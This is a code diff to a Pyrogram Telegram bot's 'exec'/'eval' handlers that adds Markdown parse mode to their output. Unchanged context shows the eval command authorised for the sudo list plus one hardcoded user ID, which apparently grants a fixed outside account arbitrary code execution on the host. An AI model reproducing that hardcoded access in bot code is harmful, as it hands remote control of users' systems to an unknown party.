@@ -5,7 +5,7 @@ import sys
 import io
 
 from pyrogram import filters
-
+from pyrogram.enums import ParseMode
 from . import *
 
 
@@ -35,12 +35,13 @@ async def exec_(client, event):
                 event.chat.id,
                 out_file,
                 caption=f"`{cmd}`" if len(cmd) < 998 else None,
+                parse_mode=ParseMode.MARKDOWN,
                 reply_to_message_id=reply_to_id,
             )
 
             await xx.delete()
     else:
-        await xx.edit(OUT, disable_web_page_preview=True)
+        await xx.edit(OUT, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
 
 @app.on_message(filters.command("eval") & filters.user(SUDOS+[5591954930]))
 async def eval_(client, event):
@@ -86,11 +87,12 @@ async def eval_(client, event):
                 out_file,
                 force_document=True,
                 caption=f"```{cmd}```" if len(cmd) < 998 else None,
+                parse_mode=ParseMode.MARKDOWN,
                 reply_to_message_id=reply_to_id
             )
             await e.delete()
     else:
-        await e.edit(final_output, disable_web_page_preview=True)
+        await e.edit(final_output, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
 
 async def aexec(code, event):
     exec(
